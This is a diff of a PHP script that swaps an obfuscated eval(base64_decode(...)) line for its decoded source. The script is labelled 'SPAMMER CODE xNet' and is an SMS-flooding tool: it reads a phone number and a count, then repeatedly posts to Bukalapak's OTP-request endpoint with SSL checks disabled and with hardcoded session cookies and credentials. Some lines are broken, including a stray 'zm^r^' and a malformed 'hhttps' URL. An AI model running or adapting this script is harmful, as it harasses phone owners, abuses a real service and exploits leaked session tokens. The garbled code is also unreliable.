@@ -1,1 +1,60 @@
-<?php eval("?>".base64_decode("PD9waHANCi8qIA0KU1BBTU1FUiBDT0RFIHhOZXQNCk1vZGlmaWVkIEJ5OiB4TmV0DQpEYXRlOiAxMC0xMC0yMDE4DQoqLw0KQGluaV9zZXQoJ291dHB1dF9idWZmZXJpbmcnLDApOw0Kc2Vzc2lvbl9zdGFydCgpOw0KZXJyb3JfcmVwb3J0aW5nKDApOw0Kc2V0X3RpbWVfbGltaXQoMCk7DQpkYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCdBc2lhL0pha2FydGEnKTsNCnptHl5yXnN5c3RlbSgiY2xlYXIiKTsNCnNsZWVwKDEpOw0KZWNobyAiKy0rLSstKy0rLi4uOjpbJCB4TmV0IFNwYW1tZXIgJF06Oi4uLi0rLSstKy0rLSstbiI7DQplY2hvICI8Zm9udCBjb2xvcj0iYmx1ZSI+eE5ldCBDeWJlcnRlYW08L2ZvbnQ+biI7DQpzbGVlcCgxKTsNCmVjaG8gIistKy0rLSstKy0rLSstKy0rLS4uLjo6WyQgeE5ldCAkXTo6Li4uLSstKy0rLSstKy0rLSstKy0rbiI7DQplY2hvICJuTk8gSFAgCShleDowOHh4eCkgOiAiOw0KJG5vID0gdHJpbShmZ2V0cyhTVERJTiwgMTAyNCkpOw0KZWNobyAibkp1bWxhaCAJKGV4OjEwKSAgICA6ICI7DQokbG9vcCA9IHRyaW0oZmdldHMoU1RESU4sIDEwMjQpKTsNCmVjaG8gIm4rLSstKy0rLSstKy0rLSstLi4uOjpbJCBIQVNJTCAkXTo6Li4uLSstKy0rLSstKy0rLSstKy0rK24iOw0KJG5vID0gJzYyJy5zdWJzdHIodHJpbSgkbm8pLCAxKTsNCmZvciAoJHg9MTsgJHg8PSRsb29wOyAkeCsrKSB7DQoJJGMgPSBjdXJsX2luaXQoKTsNCgljdXJsX3NldG9wdCgkYywgQ1VSTE9QVF9VUkwsICJoaHR0cHM6Ly93d3cuYnVrYWxhcGFrLmNvbS90cnVzdGVkX2RldmljZXMvb3RwX3JlcXVlc3QiKTsNCgljdXJsX3NldG9wdCgkYywgQ1VSTE9QVF9TU0xfVkVSSUZZSE9TVCwgMCk7DQoJY3VybF9zZXRvcHQoJGMsIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIDApOw0KCWN1cmxfc2V0b3B0KCRjLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsNCgljdXJsX3NldG9wdCgkYywgQ1VSTE9QVF9IVFRQSEVBREVSLCBhcnJheSgNCgkJJ0Nvb2tpZTogaWRlbnRpdHk9MjdiMDg0NTU4ZDdiNzk0OTRlNzJlMmM4NzU3YzRkZWY7IGJyb3dzZXJfaWQ9NWQ1N2UzOTQ5ZmUwNTJmZmM2NWNhYWY4MWI2MjRjMmY7IHNlc3Npb25faWQ9ZjEzMmY1MTZhMzA1YTNhYWU1ZWE3MzgyMWNlMGZhNTA7IF9nYT1HQTEuMi45OTQ4ODgzMTEuMTUzOTE3MTcwNzsgX2dpZD1HQTEuMi43NzYzNzA5Mi4xNTM5MTcxNzA3OyBfZ2NsX2F1PTEuMS45NDQ5MTIwNDAuMTUzOTE3MTcwNzsgX3Z3b191dWlkX3YyPURENERBNThEMEJGQTMzMjNDOTkxMkIxQjlGOUIwMUI5OXw0ZDE4OWViNWMxMDc5MzY0YzA4ODRhMTA4YzJkOWYxZDsgc2NzPSU3QiUyMnQlMjIlM0ExJTdEOyBfX2F1Yz03YmMxOTQ4MjE2NjVkYzg3MDk3ZTU0NTlhMDA7IGlucy1taWctZG9uZT0xOyBpbnMtZ2FTU0lkPTVhNDM3Mzg1LTc4OGQtYzE1NS0zYmJkLTIxMWJmZmE1YmM0NF8xNTM5MTc1MzEwOyBzcFVJRD0xNTM5MTcxNzEwNDYzYjA1YmVjYTQ2NS4yOTE0MWMwYTsgX2ZicD1mYi4xLjE1MzkxNzE3MTgxMDMuMTg1MjQ4MjQ2MzsgaW5zVXNlckRhdGE9JTdCJTIyZW1haWwlMjIlM0ElMjJ4bmV0Y3liZXJ0ZWFtJTQwZ21haWwuY29tJTIyJTdEOyB1c2VyX2NyZWRlbnRpYWxzPTRlMWZkNjMyYWIzMDM0YTAwZjlkYTY5NmVhMWM2NmQ2ZGZkYmU5MTU0MTk1NDg2NWExZTMyMGUxOTgxZTU1ODRmNDQ3M2QxZDFmMjRhNDcxNTMwOTdiM2RiYmE2N2IwMWYyYzdkMzU4OTNiM2EzOWY4NjQ2MjQ2NmRkODg5MzNjJTNBJTNBMjMxOTg5ODE7IF9fYXNjPTI3NjMwNzE2MTY2NWRjYTZhMzczMzU0MjkyNjsgX2dhdD0xOyBtcF81MTQ2N2E0NDBmZjYwMmUwYzEzZDUxM2MzNjM4N2VhOF9taXhwYW5lbD0lN0IlMjJkaXN0aW5jdF9pZCUyMiUzQSUyMCUyMmR0OGc1JTIyJTJDJTIyJTI0aW5pdGlhbF9yZWZlcnJlciUyMiUzQSUyMCUyMiUyNGRpcmVjdCUyMiUyQyUyMiUyNGluaXRpYWxfcmVmZXJyaW5nX2RvbWFpbiUyMiUzQSUyMCUyMiUyNGRpcmVjdCUyMiU3RDsgX3RkPTk5NWUzMjY1LWVmMzMtNDQ5YS1iZGFhLTE1Y2EyNWE0MTFlZDsgaW5zZHJTVj03OyBsc2tqZmV3anJoMzRnaGoyM2JyamgyMzQ9ZEhGcmQzbzRaWEJrVFZWdmFrVlFaRVo1Yldwa1RYZHZVa1pMYVc5dk9GSkJablpsYlZnMUx6SmhMeTltYzJ4RlJGaHJhak56UVZOWFkzSmFiSEpaVDJFdlVqSXpaM1pEWkVWb1pGbzJkMHhYTVdSbkszazJkM2RVVDBoQmFrcE9UbFZCWmxVeU4zWkdkVE5WTm5CNlJWWkhRVkJpTVZkdGJGcHNabnBzV1doTFVqbHVibXBsTUV4TFFWUlZabkZPTXl0aGFEUldhMDlxUzBGMGFIQkJVMmNyT0hvNFV6WnNSbWRZVW01NFZFMUVTRUZYYUd0d05YZDNLMUZqUWxwTU9IVTVaMWRyVXpWUk4yMWlaM0paU2tKaUsxQmxPVlpwWmpoNmVrNXJaRUZ1UWtoRFdpdGFTR3A0T0hneGJuVlplRko1TlZWc01ITmxlWFEzZVVGUFYyUlBNblZSUzFnMllYSnZLemhrU1ZkRVRrSk5VMnhKV1RoS2JXaDRSblZGZDIxVFJXMVVlVU5pVjBGaGVtdFdiRmRWTTJ0TFNUTjNTM0JPTDNVMVJDdEZRelZ5U1d0U2MwNHJNbUpsWTJjMFZEaHFUSFpWUjFkV1VqVk5kakpGYzJGbmVYTXpRVkZpUzFCTVoyWXdTMlpDTlVSR1FVb3ZTMFpITkVwS01tWmlURk01U25OU1NpOVljek5tTjFWYVJsZHJlVEpOUjFWWVJESk9Xbk0zU1ZSbVkzaGFNSEZhVUhoT2NsVk5Va29yVTB0UFpXbzNObXhUVEZaa0sySm9SalZhUlRSSk9GSnJjVko0ZDJzMGNtZElVVnBUVTNjOVBTMHRiR2hDVlhsb1VrbDBUbnAzVGxWc1dWZ3JOVlYzWnowOS0tZWU4NzQwODUwYzA1YjM2MDRhM2I3YTBkNDliMjM4ZTNmZmM2YjZlOScsDQoJICAgICdVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxJywNCgkgICAgJ09yaWdpbjogaHR0cHM6Ly93d3cuYnVrYWxhcGFrLmNvbScsDQoJICAgICdBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyJywNCgkgICAgJ0FjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjknLA0KCSAgICAnVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNjkuMC4zNDk3LjEwMCBTYWZhcmkvNTM3LjMnLA0KCSAgICAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgnLA0KCSAgICAnQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywNCgkgICAgJ1JlZmVyZXI6IGh0dHBzOi8vd3d3LmJ1a2FsYXBhay5jb20vdXNlcnMvMjMxOTg5ODEvZWRpdD9zZWN0aW9uPWVtYWlsX3Bob25lJywNCgkgICAgJ0Nvbm5lY3Rpb246IGtlZXAtYWxpdmUnDQoJKSk7DQoJY3VybF9zZXRvcHQoJGMsIENVUkxPUFRfUE9TVEZJRUxEUywiZmVhdHVyZT1waG9uZV9jb25maXJtYXRpb24mZmVhdHVyZV90YWc9Jm1hbnVhbF9waG9uZT0kbm8mY2hhbm5lbD1TTVMmZGV2aWNlX2ZpbmdlcnByaW50PWE0NDc1ZDEwNDQ3MDQwYWQ2Zjc3ZWZlM2IyYTYxNzQxIik7DQoJY3VybF9zZXRvcHQoJGMsIENVUkxPUFRfUE9TVCwgMSk7DQoJJGhhc2lsID0gY3VybF9leGVjKCRjKTsNCgkvL0ZVTkdTSSBGQUxTRQ0KCWlmICgkaGFzaWwgPT0gIkJ1a2FsYXBhayB0ZWxhaCBtZW5naXJpbWthbiBrb2RlIG90ZW50aWthc2kgbGV3YXQgU01TIGtlICRubyIpIHsNCgkJJGxvb3AgKz0gMTsNCgkJZWNobyAiZVs5MW0keC4gR2FnYWwgTWVuZ2lyaW0gOihuZVs5N21Db3VudCArMW4iLigkbG9vcC0keCkuIiBSZW1haW5pbmduZVs5M21TbGVlcCBpbiAzMHNuIjsNCgkJZmx1c2goKTsNCgkJc2xlZXAoMzApOwkJDQoJfSBlbHNlIHsNCgkJZWNobyAiICAgJHguIE5PIEhQIDogWyAkbm8gXSBbIFNUQVRVUyA6IEJFUkhBU0lMIF0gW3hOZXQgQ3liZXJ0ZWFtXSAgICBuIjsNCgkJZmx1c2goKTsNCgkJc2xlZXAoNSk7CQkNCgl9DQp9DQplY2hvICIrfn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fituIjsNCmVjaG8gIisgICAgICAgLi4uOjpbJF0geE5ldCBDeWJlcnRlYW0gQ3JhY2tlciBbJF06Oi4gICAgICAgICtuIjsNCmVjaG8gIit+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+K24iOw0KPz4NCg==")); ?>
+<?php
+/* 
+SPAMMER CODE xNet
+Modified By: xNet
+Date: 10-10-2018
+*/
+@ini_set('output_buffering',0);
+session_start();
+error_reporting(0);
+set_time_limit(0);
+date_default_timezone_set('Asia/Jakarta');
+zm^r^system("clear");
+sleep(1);
+echo "+-+-+-+-+...::[$ xNet Spammer $]::...-+-+-+-+-+-\n";
+echo "<font color="blue">xNet Cyberteam</font>\n";
+sleep(1);
+echo "+-+-+-+-+-+-+-+-+-...::[$ xNet $]::...-+-+-+-+-+-+-+-+-+\n";
+echo "\nNO HP 	(ex:08xxx) : ";
+$no = trim(fgets(STDIN, 1024));
+echo "\nJumlah 	(ex:10)    : ";
+$loop = trim(fgets(STDIN, 1024));
+echo "\n+-+-+-+-+-+-+-+-...::[$ HASIL $]::...-+-+-+-+-+-+-+-+-++\n";
+$no = '62'.substr(trim($no), 1);
+for ($x=1; $x<=$loop; $x++) {
+	$c = curl_init();
+	curl_setopt($c, CURLOPT_URL, "hhttps://www.bukalapak.com/trusted_devices/otp_request");
+	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
+	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
+	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($c, CURLOPT_HTTPHEADER, array(
+		'Cookie: identity=27b084558d7b79494e72e2c8757c4def; browser_id=5d57e3949fe052ffc65caaf81b624c2f; session_id=f132f516a305a3aae5ea73821ce0fa50; _ga=GA1.2.994888311.1539171707; _gid=GA1.2.77637092.1539171707; _gcl_au=1.1.944912040.1539171707; _vwo_uuid_v2=DD4DA58D0BFA3323C9912B1B9F9B01B99|4d189eb5c1079364c0884a108c2d9f1d; scs=%7B%22t%22%3A1%7D; __auc=7bc194821665dc87097e5459a00; ins-mig-done=1; ins-gaSSId=5a437385-788d-c155-3bbd-211bffa5bc44_1539175310; spUID=1539171710463b05beca465.29141c0a; _fbp=fb.1.1539171718103.1852482463; insUserData=%7B%22email%22%3A%22xnetcyberteam%40gmail.com%22%7D; user_credentials=4e1fd632ab3034a00f9da696ea1c66d6dfdbe91541954865a1e320e1981e5584f4473d1d1f24a47153097b3dbba67b01f2c7d35893b3a39f86462466dd88933c%3A%3A23198981; __asc=276307161665dca6a3733542926; _gat=1; mp_51467a440ff602e0c13d513c36387ea8_mixpanel=%7B%22distinct_id%22%3A%20%22dt8g5%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D; _td=995e3265-ef33-449a-bdaa-15ca25a411ed; insdrSV=7; lskjfewjrh34ghj23brjh234=dHFrd3o4ZXBkTVVvakVQZEZ5bWpkTXdvUkZLaW9vOFJBZnZlbVg1LzJhLy9mc2xFRFhrajNzQVNXY3JabHJZT2EvUjIzZ3ZDZEVoZFo2d0xXMWRnK3k2d3dUT0hBakpOTlVBZlUyN3ZGdTNVNnB6RVZHQVBiMVdtbFpsZnpsWWhLUjlubmplMExLQVRVZnFOMythaDRWa09qS0F0aHBBU2crOHo4UzZsRmdYUm54VE1ESEFXaGtwNXd3K1FjQlpMOHU5Z1drUzVRN21iZ3JZSkJiK1BlOVZpZjh6ek5rZEFuQkhDWitaSGp4OHgxbnVZeFJ5NVVsMHNleXQ3eUFPV2RPMnVRS1g2YXJvKzhkSVdETkJNU2xJWThKbWh4RnVFd21TRW1UeUNiV0FhemtWbFdVM2tLSTN3S3BOL3U1RCtFQzVySWtSc04rMmJlY2c0VDhqTHZVR1dWUjVNdjJFc2FneXMzQVFiS1BMZ2YwS2ZCNURGQUovS0ZHNEpKMmZiTFM5SnNSSi9YczNmN1VaRldreTJNR1VYRDJOWnM3SVRmY3haMHFaUHhOclVNUkorU0tPZWo3NmxTTFZkK2JoRjVaRTRJOFJrcVJ4d2s0cmdIUVpTU3c9PS0tbGhCVXloUkl0Tnp3TlVsWVgrNVV3Zz09--ee8740850c05b3604a3b7a0d49b238e3ffc6b6e9',
+	    'Upgrade-Insecure-Requests: 1',
+	    'Origin: https://www.bukalapak.com',
+	    'Accept-Encoding: gzip, deflate, br',
+	    'Accept-Language: en-US,en;q=0.9',
+	    'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.3',
+	    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
+	    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+	    'Referer: https://www.bukalapak.com/users/23198981/edit?section=email_phone',
+	    'Connection: keep-alive'
+	));
+	curl_setopt($c, CURLOPT_POSTFIELDS,"feature=phone_confirmation&feature_tag=&manual_phone=$no&channel=SMS&device_fingerprint=a4475d10447040ad6f77efe3b2a61741");
+	curl_setopt($c, CURLOPT_POST, 1);
+	$hasil = curl_exec($c);
+	//FUNGSI FALSE
+	if ($hasil == "Bukalapak telah mengirimkan kode otentikasi lewat SMS ke $no") {
+		$loop += 1;
+		echo "\e[91m$x. Gagal Mengirim :(\n\e[97mCount +1\n".($loop-$x)." Remaining\n\e[93mSleep in 30s\n";
+		flush();
+		sleep(30);		
+	} else {
+		echo "   $x. NO HP : [ $no ] [ STATUS : BERHASIL ] [xNet Cyberteam]    \n";
+		flush();
+		sleep(5);		
+	}
+}
+echo "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+\n";
+echo "+       ...::[$] xNet Cyberteam Cracker [$]::.        +\n";
+echo "+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+\n";
+?>
